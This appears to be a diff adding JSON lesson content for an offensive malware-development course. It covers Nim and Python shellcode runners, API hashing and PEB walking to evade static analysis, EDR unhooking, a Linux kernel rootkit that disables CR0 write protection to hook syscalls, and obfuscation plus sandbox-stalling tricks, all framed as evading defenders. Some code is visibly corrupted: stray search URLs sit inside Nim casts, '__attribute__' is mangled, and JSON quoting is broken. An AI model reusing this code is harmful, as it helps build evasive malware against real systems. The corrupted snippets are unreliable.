@@ -1,0 +1,342 @@
+{
+"m5-1": {
+"steps": [
+{
+"type": "concept",
+"heading": "Why Nim?",
+"body": "Nim is the quiet kid in the back of the class who secretly knows martial arts. It's high-level like Python but compiles down to C and C++ natively. This means we get the rapid development of a scripting language, but the execution speed and low-level memory access of C.\n\nFrom an offensive standpoint, Nim is beautiful because its compiled binaries often bypass static signature checks that flag standard C# or C++ tooling. It doesn't look like standard malware to the blue team's initial filters."
+},
+{
+"type": "concept",
+"heading": "Memory Execution Mechanics",
+"body": "To run shellcode, we can't just drop bytes on the floor and expect the CPU to read them. Modern operating systems partition memory into strict zones. If you try to execute code in a 'read-only' zone, the OS throws an Access Violation and kills your process.\n\nWe must ask the OS for a specific carve-out of memory, mark it as executable, copy our malicious bytes into it, and then trick the program execution flow to jump to that address. In Nim, we leverage the Windows API directly to make these allocations."
+},
+{
+"type": "code",
+"heading": "Allocating Memory in Nim",
+"body": "Here we use the winim library to talk directly to Windows. We request memory that allows reading, writing, and executing.",
+"code": "import winim/lean\n\n# Our payload: simple NOPs and a breakpoint for testing\nvar shellcode: array[4, byte] = [byte 0x90, 0x90, 0xcc, 0xc3]\n\n# Ask the OS for memory. We use PAGE_EXECUTE_READWRITE for full permissions.\nvar ptrMemory = VirtualAlloc(nil, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n\n# Copy our payload into the freshly allocated space\ncopyMem(ptrMemory, addr shellcode[0], shellcode.len)\n"
+},
+{
+"type": "code_practice",
+"heading": "Memory Allocation Drill",
+"context": "Call the Windows API function "VirtualAlloc" to provision memory for the shellcode.",
+"code_before": "import winim/lean\nvar sc: array[2, byte] = [byte 0x90, 0xc3]\nvar p = ",
+"code_after": "(nil, sc.len, MEM_COMMIT, 0x40)",
+"correct_answer": "VirtualAlloc"
+},
+{
+"type": "code",
+"heading": "Casting the Pointer",
+"body": "We have our memory allocated and populated. Now we must force Nim to treat this raw pointer as a callable function.",
+"code": "import winim/lean\n\n# ... allocation and copy happened here ...\nvar ptrMemory = VirtualAlloc(nil, 4, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n\n# Now we need to tell Nim to treat this raw memory address as a procedure.\n# We cast the pointer to a proc using the {.nimcall.} compiler pragma.\nlet executable = cast[proc(){.nimcall.}](https://www.google.com/search?q=ptrMemory)\n\n# Fire the shellcode by calling the variable like a standard function\nexecutable()\n"
+},
+{
+"type": "code_practice",
+"heading": "Execution Casting Drill",
+"context": "Use the "cast" keyword to turn our pointer into a callable procedure.",
+"code_before": "var p = VirtualAlloc(nil, 2, MEM_COMMIT, 0x40)\nlet executable = ",
+"code_after": "[proc(){.nimcall.}](https://www.google.com/search?q=p)\nexecutable()",
+"correct_answer": "cast"
+},
+{
+"type": "concept",
+"heading": "The RWX Trap",
+"body": "Allocating memory as PAGE_EXECUTE_READWRITE (RWX) is an immediate red flag for modern Endpoint Detection and Response (EDR) platforms. Legitimate applications rarely need memory to be both writable and executable at the same time.\n\nA stealthier approach is to allocate as Read/Write (RW), copy the shellcode in, and then use VirtualProtect to flip the permissions to Read/Execute (RX) just before calling it. This mimics standard Just-In-Time (JIT) compilation behavior."
+},
+{
+"type": "code_practice",
+"heading": "Permissions Drill",
+"context": "Use the "PAGE_EXECUTE_READWRITE" constant so the CPU doesn't throw an access violation during execution.",
+"code_before": "var p = VirtualAlloc(nil, len, MEM_COMMIT, ",
+"code_after": ")",
+"correct_answer": "PAGE_EXECUTE_READWRITE"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "Your Nim shellcode runner compiles perfectly, but crashes instantly when executed on a target machine without alerting the AV. You are currently mapping memory as PAGE_READWRITE. Why did it crash?",
+"options": [
+"Nim runtime dependencies are missing on the target machine.",
+"The CPU threw an Access Violation because you attempted to execute non-executable memory.",
+"The EDR hooked your process and silently terminated it.",
+"You used winim/lean instead of the full winim library."
+],
+"correct": 1,
+"hint": "Remember the strict zones modern operating systems use to partition memory."
+}
+]
+},
+"m5-2": {
+"steps": [
+{
+"type": "concept",
+"heading": "Weaponizing Python",
+"body": "Python is ubiquitous. Many network appliances, Linux servers, and developer workstations have Python installed by default. This makes it an incredible "Living off the Land" (LotL) tool. If we can run our payloads entirely in Python, we avoid dropping suspicious executables to the disk.\n\nHowever, standard Python doesn't have low-level memory access. To weaponize it, we must bridge the gap between Python's high-level environment and the host operating system's native API."
+},
+{
+"type": "concept",
+"heading": "The CTypes Bridge",
+"body": "The 'ctypes' library is our skeleton key. It's a built-in Python library that allows calling functions in shared libraries (like DLLs on Windows or SOs on Linux). \n\nBy leveraging ctypes, we can bypass Python's guardrails. We can reach directly into Windows kernel32.dll, allocate raw memory, parse executable formats, and spin up native OS threads—all from a seemingly innocent .py script."
+},
+{
+"type": "code",
+"heading": "Ctypes Memory Allocation",
+"body": "Here we use Python to reach into Windows internals and allocate memory for our payload.",
+"code": "import ctypes\n\n# A classic payload represented as raw bytes\nbuf = b"\x90\x90\x90\xc3"\n\n# Get a handle to kernel32.dll natively\nkernel32 = ctypes.windll.kernel32\n\n# Allocate memory. 0x3000 = MEM_COMMIT | MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE\nptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(buf)), ctypes.c_int(0x3000), ctypes.c_int(0x40))\n"
+},
+{
+"type": "code_practice",
+"heading": "Ctypes Bridging Drill",
+"context": "Access the "kernel32" library via ctypes.windll to call VirtualAlloc.",
+"code_before": "import ctypes\nbuf = b"\x90\x90\xcc\xc3"\nlib = ctypes.windll.",
+"code_after": "\nptr = lib.VirtualAlloc(0, len(buf), 0x3000, 0x40)",
+"correct_answer": "kernel32"
+},
+{
+"type": "code",
+"heading": "Writing the Payload",
+"body": "Once memory is allocated, we can't just assign the Python byte array to the pointer. We must move the bytes into the native memory space.",
+"code": "import ctypes\n\nbuf = b"\x90\xc3"\nptr = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)\n\n# We use RtlMoveMemory to move our python bytes array into the unmanaged memory\n# First, we format the python buffer to a c_char array\nbuf_type = (ctypes.c_char * len(buf)).from_buffer_copy(buf)\n\n# Then we copy it into the allocated pointer space\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf_type, ctypes.c_int(len(buf)))\n"
+},
+{
+"type": "code_practice",
+"heading": "Memory Movement Drill",
+"context": "Use the "RtlMoveMemory" function to copy your payload into the newly allocated space.",
+"code_before": "buf_type = (ctypes.c_char * len(buf)).from_buffer_copy(buf)\nctypes.windll.kernel32.",
+"code_after": "(ctypes.c_int(ptr), buf_type, ctypes.c_int(len(buf)))",
+"correct_answer": "RtlMoveMemory"
+},
+{
+"type": "concept",
+"heading": "OpSec and Runtime",
+"body": "Just because you are running in memory doesn't mean you are invisible. Dropping an encoded string into a Python script will bypass basic static analysis, but as soon as `RtlMoveMemory` puts those bytes into executable space, runtime scanners take notice.\n\nFurthermore, creating a thread via `CreateThread` pointing to unbacked memory (memory not associated with a legitimate file on disk) is a classic indicator of compromise (IoC)."
+},
+{
+"type": "code_practice",
+"heading": "Thread Execution Drill",
+"context": "Call the "CreateThread" function to spin up execution of your shellcode.",
+"code_before": "ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len)\nhandle = ctypes.windll.kernel32.",
+"code_after": "(0, 0, ptr, 0, 0, ctypes.byref(ctypes.c_int(0)))",
+"correct_answer": "CreateThread"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "You write a Python payload that downloads encrypted shellcode, decrypts it in a variable, and executes it in memory via ctypes. The EDR still catches it. Assuming the static script was clean, what likely gave you away?",
+"options": [
+"Python's garbage collector automatically deletes RWX memory.",
+"The EDR monitored the runtime API calls like VirtualAlloc and CreateThread.",
+"You forgot to compile the Python script to an EXE first.",
+"The ctypes library is inherently flagged as malware by all EDRs."
+],
+"correct": 1,
+"hint": "Think about what happens after the script bypasses static analysis and actually begins interacting with the native OS."
+}
+]
+},
+"m5-3": {
+"steps": [
+{
+"type": "concept",
+"heading": "Defeating Static Analysis",
+"body": "When you compile a C binary, every Windows API function you use (like VirtualAlloc) is normally placed in the Import Address Table (IAT). The blue team can just look at your binary's IAT and say, 'Ah, it allocates memory and creates threads. It's malware.'\n\nAdvanced evasion requires hiding your intent. We stop relying on the compiler to link our functions. Instead, we manually find and load them at runtime, ensuring our IAT remains completely benign."
+},
+{
+"type": "concept",
+"heading": "API Hashing",
+"body": "If we resolve functions dynamically, we usually pass strings like "VirtualAlloc" to GetProcAddress. But now "VirtualAlloc" is sitting in our binary's string pool—another massive red flag.\n\nTo fix this, we use API Hashing. We pre-calculate a mathematical hash of the function name. At runtime, we iterate through every available function in the operating system, hash its name, and see if it matches our pre-calculated value. No strings, no signatures."
+},
+{
+"type": "code",
+"heading": "The djb2 Hash Algorithm",
+"body": "This is the classic djb2 hash algorithm by Dan Bernstein. It is small, fast, and effectively hides our strings from static analysis tools.",
+"code": "#include <stdint.h>\n\n// We use this to hash function names so AV doesn't see suspicious strings.\nuint32_t djb2_hash(const unsigned char *str) {\n    uint32_t hash = 5381; // Magic initialization number\n    int c;\n    \n    while ((c = *str++)) {\n        // hash * 33 + c\n        hash = ((hash << 5) + hash) + c;\n    }\n    return hash;\n}\n"
+},
+{
+"type": "code_practice",
+"heading": "Hash Initialization Drill",
+"context": "Initialize the hash with the classic magic number "5381".",
+"code_before": "uint32_t djb2_hash(unsigned char *str) {\n    uint32_t hash = ",
+"code_after": ";\n    int c;\n    while ((c = *str++)) { hash = ((hash << 5) + hash) + c; }\n    return hash;\n}",
+"correct_answer": "5381"
+},
+{
+"type": "code",
+"heading": "Walking the PEB",
+"body": "To dynamically resolve functions without using standard Windows APIs, we must locate the Process Environment Block (PEB). The PEB tells us exactly where essential system libraries are loaded in memory.",
+"code": "#include <windows.h>\n#include <winternl.h>\n\n// Pull the PEB directly from CPU registers to avoid API calls\ninline PPEB get_peb(void) {\n#ifdef _WIN64\n    // In 64-bit Windows, the PEB is at offset 0x60 in the GS segment.\n    return (PPEB)__readgsqword(0x60);\n#else\n    // In 32-bit Windows, the PEB is at offset 0x30 in the FS segment.\n    return (PPEB)__readfsdword(0x30);\n#endif\n}\n"
+},
+{
+"type": "code_practice",
+"heading": "Register Reading Drill",
+"context": "Read the GS segment register using "__readgsqword" to fetch the PEB address on 64-bit architectures.",
+"code_before": "inline PPEB get_peb_x64(void) {\n    // Extract PEB from offset 0x60\n    return (PPEB)",
+"code_after": "(0x60);\n}",
+"correct_answer": "__readgsqword"
+},
+{
+"type": "concept",
+"heading": "Unhooking the Matrix",
+"body": "EDRs inject their own DLLs into your process to hook functions like VirtualAlloc. When you call it, execution diverts to the EDR for inspection before passing to the real OS.\n\nDynamic resolution bypasses the IAT, but you are still calling the hooked memory address. To evade this, advanced malware maps a fresh, unhooked copy of system libraries (like NTDLL.dll) directly from the hard drive, completely blinding the EDR."
+},
+{
+"type": "code_practice",
+"heading": "PEB Structure Drill",
+"context": "Access the "Ldr" structure within the PEB, which contains the linked list of loaded modules.",
+"code_before": "PPEB pPeb = get_peb();\n// Traverse to the Loader Data structure\nPPEB_LDR_DATA pLdr = pPeb->",
+"code_after": ";",
+"correct_answer": "Ldr"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "You implemented API Hashing to resolve VirtualAlloc dynamically, ensuring your IAT is completely clean. However, an EDR still intercepts your memory allocation. Why?",
+"options": [
+"The djb2 algorithm is easily reversible by the EDR.",
+"The EDR hooked the function in memory, so dynamically resolving the pointer still leads you to the EDR's trap.",
+"VirtualAlloc always triggers an alert regardless of how it is called.",
+"You used a 32-bit PEB offset on a 64-bit system."
+],
+"correct": 1,
+"hint": "Think about the difference between finding the address of a function and what actually resides at that address."
+}
+]
+},
+"m8-1": {
+"steps": [
+{
+"type": "concept",
+"heading": "Ring 0: God Mode",
+"body": "Welcome to the kernel. In user-space (Ring 3), if your C program dereferences a null pointer, the OS kills your process and generates a core dump. It's safe. It's padded.\n\nIn kernel-space (Ring 0), you are the operating system. If you dereference a null pointer, the entire machine panics and hard crashes. Writing a Linux Kernel Module (LKM) means you have absolute power to hide files, intercept network traffic, or escalate privileges—but the margin for error is absolutely zero."
+},
+{
+"type": "concept",
+"heading": "Module Architecture",
+"body": "A kernel module is simply an object file that extends the running kernel. It doesn't have a `main()` function.\n\nInstead, it has entry and exit points. When the module is loaded via `insmod`, the kernel executes your initialization function. When it is removed via `rmmod`, the kernel executes your cleanup function. Everything you do—hooking syscalls, registering drivers—happens between these two events."
+},
+{
+"type": "code",
+"heading": "The LKM Skeleton",
+"body": "This is the absolute minimum code required to load a module into the Linux kernel and print a message to the kernel logs.",
+"code": "#include <linux/module.h>\n#include <linux/kernel.h>\n\n// Initialization function executed on module load\nstatic int __init rootkit_init(void) {\n    printk(KERN_INFO "Rootkit loaded. We are in Ring 0.\n");\n    return 0; // Return 0 indicates success\n}\n\n// Cleanup function executed on module removal\nstatic void __exit rootkit_exit(void) {\n    printk(KERN_INFO "Rootkit unloaded.\n");\n}\n\n// Register the macros\nmodule_init(rootkit_init);\nmodule_exit(rootkit_exit);\n"
+},
+{
+"type": "code_practice",
+"heading": "Init Macro Drill",
+"context": "Use the "__init" macro to mark the function so the kernel knows to discard it from memory after initialization finishes.",
+"code_before": "static int ",
+"code_after": " stealth_module_start(void) {\n    return 0;\n}",
+"correct_answer": "__init"
+},
+{
+"type": "code",
+"heading": "Modifying Control Registers",
+"body": "To intercept system calls, we must overwrite entries in the sys_call_table. By default, this table is read-only. We must modify the CPU's Control Register 0 (CR0) to disable write protection.",
+"code": "#include <linux/module.h>\n#include <asm/paravirt.h>\n\n// Function to bypass kernel memory write protections\ninline void disable_wp(void) {\n    // Read the current state of Control Register 0\n    unsigned long cr0 = read_cr0();\n    \n    // Clear the 16th bit, which enforces Write Protection\n    clear_bit(16, &cr0);\n    \n    // Write the modified state back to the CPU\n    write_cr0(cr0);\n}\n"
+},
+{
+"type": "code_practice",
+"heading": "CR0 Write Drill",
+"context": "Call "write_cr0" to write the modified value back to the control register, disabling memory protections.",
+"code_before": "inline void disable_wp(void) {\n    unsigned long cr0 = read_cr0();\n    clear_bit(16, &cr0);\n    ",
+"code_after": "(cr0);\n}",
+"correct_answer": "write_cr0"
+},
+{
+"type": "concept",
+"heading": "Concurrency and Panic",
+"body": "The kernel is inherently concurrent. Multiple processes might be executing your system call hook simultaneously across different CPU cores.\n\nIf your rootkit uses a global variable without proper locking mechanisms (like spinlocks or mutexes), a race condition will corrupt kernel memory. In user-space, a race condition causes a glitch. In Ring 0, a race condition triggers a Kernel Panic, instantly blue-screening the server."
+},
+{
+"type": "code_practice",
+"heading": "Module Registration Drill",
+"context": "Use the "module_init" macro to tell the kernel which function to execute upon loading the LKM.",
+"code_before": "static int __init setup_hooks(void) { return 0; }\n",
+"code_after": "(setup_hooks);",
+"correct_answer": "module_init"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "You successfully load your rootkit and disable write protection on the syscall table. You overwrite the open() syscall with your custom hook. Ten minutes later, the server crashes with a 'kernel paging request' panic. What is the most likely cause?",
+"options": [
+"You forgot to re-enable write protection after modifying the table.",
+"Your custom hook accessed user-space memory directly without using copy_from_user().",
+"The blue team detected your module and forced a system crash.",
+"You used printk() inside your initialization function."
+],
+"correct": 1,
+"hint": "The kernel cannot blindly trust pointers provided by a user-space application."
+}
+]
+},
+"m8-2": {
+"steps": [
+{
+"type": "concept",
+"heading": "The Compiler Adversary",
+"body": "When writing advanced malware in C, the compiler is simultaneously your best friend and your worst enemy. Compilers like GCC and Clang are designed to optimize code—they aggressively remove unused variables, simplify complex math, and delete unreachable branches.\n\nIf you write junk code to confuse an analyst, the compiler will gleefully strip it out, leaving your core malicious logic perfectly exposed. We must learn to weaponize the compiler to maintain our obfuscation."
+},
+{
+"type": "concept",
+"heading": "Opaque Predicates",
+"body": "An opaque predicate is a condition where the outcome is known to the programmer at compile time, but cannot be deduced by static analysis tools or the compiler's optimizer.\n\nBy forcing the malware into seemingly complex conditional logic that always evaluates a specific way, we create 'spaghetti code' that breaks decompilers and massively inflates the time required for a reverse engineer to understand the control flow."
+},
+{
+"type": "code",
+"heading": "Implementing Opaque Predicates",
+"body": "We use the volatile keyword to force the compiler to treat a variable as unpredictable, preventing it from optimizing away our fake branches.",
+"code": "#include <stdio.h>\n\n// The volatile keyword tells the compiler this variable could change at any time (e.g., via hardware).\nvolatile int fake_flag = 1;\n\nvoid run_payload(void) {\n    // The optimizer cannot simplify this because of 'volatile'\n    if (fake_flag > 0) {\n        puts("Executing real payload...");\n    } else {\n        // This junk block is preserved in the final binary.\n        // A reverse engineer has to waste time analyzing it.\n        puts("Decrypting fake shellcode...");\n    }\n}\n"
+},
+{
+"type": "code_practice",
+"heading": "Volatile Drill",
+"context": "Mark the variable with the "volatile" keyword to prevent the compiler from optimizing away the fake branch.",
+"code_before": "// Prevent optimization\n",
+"code_after": " int op_flag = 1;",
+"correct_answer": "volatile"
+},
+{
+"type": "code",
+"heading": "Control Flow Flattening",
+"body": "Control Flow Flattening destroys the logical structure of functions. It takes a linear sequence of basic blocks and shoves them all inside a massive, looping switch statement governed by a state variable.",
+"code": "#include <stdio.h>\n\n// A flattened function is miserable to read in IDA Pro or Ghidra.\nvoid flattened_logic(void) {\n    int state = 0;\n    \n    while (state != 3) {\n        switch (state) {\n            case 0:\n                puts("Step 1: Unpack");\n                state = 1;\n                break;\n            case 1:\n                puts("Step 2: Inject");\n                state = 3;\n                break;\n        }\n    }\n}\n"
+},
+{
+"type": "code_practice",
+"heading": "Flattening Loop Drill",
+"context": "Use a "switch" statement to handle the flattened state machine transitions inside the loop.",
+"code_before": "void flat(void) {\n    int state = 0;\n    while (state != 99) {\n        ",
+"code_after": " (state) {\n            case 0: state = 99; break;\n        }\n    }\n}",
+"correct_answer": "switch"
+},
+{
+"type": "concept",
+"heading": "Compiler Directives",
+"body": "Sometimes, the easiest way to defeat the compiler is just to tell it to back off. Modern C compilers provide attributes and pragmas that allow you to dictate optimization levels on a per-function basis.\n\nIf you have a carefully crafted loop designed to stall execution and defeat sandbox sandboxing (sleep patching), you must disable optimization for that specific function, otherwise the compiler transforms your delay loop into a NO-OP."
+},
+{
+"type": "code_practice",
+"heading": "Optnone Drill",
+"context": "Use the "**attribute**" syntax to apply the optnone directive, disabling optimization for this function.",
+"code_before": "// Completely disable optimization for this stalling loop\n",
+"code_after": "((optnone))\nvoid stall_sandbox(void) {\n    int i = 0;\n    while(i < 0xFFFFFF) { i++; }\n}",
+"correct_answer": "**attribute**"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "You write an opaque predicate using a complex mathematical equation that always equals 1. However, when you reverse engineer your compiled binary in Ghidra, the entire equation is gone and only the true branch exists. What happened?",
+"options": [
+"Ghidra automatically hides opaque predicates in its decompilation view.",
+"The compiler statically solved the equation during optimization and removed the dead code.",
+"You used a switch statement instead of an if/else block.",
+"The equation resulted in a buffer overflow during compilation."
+],
+"correct": 1,
+"hint": "Compilers are exceptionally good at doing math ahead of time if the inputs are known."
+}
+]
+}
+}
